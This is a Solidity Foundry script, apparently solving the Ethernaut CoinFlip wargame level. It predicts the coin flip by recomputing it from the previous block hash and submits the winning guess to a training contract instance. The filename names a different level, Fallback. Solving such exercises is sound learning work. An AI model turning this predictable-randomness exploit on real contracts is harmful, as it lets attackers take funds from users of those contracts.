// script/FallbackExploit.s.sol
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract CoinFlipExploit is Script {
    function run() external {
        // 你的钱包私钥（通过环境变量传入，勿硬编码）
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        
        // 替换为你的Ethernaut实例地址
        CoinFlip instance = CoinFlip(0xf4Ce1788aF43fE7aa1adB06D589E7cd9B36A0F2E);

        vm.startBroadcast(privateKey);
       
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            instance.flip(side);
        

        
        vm.stopBroadcast();
    }
}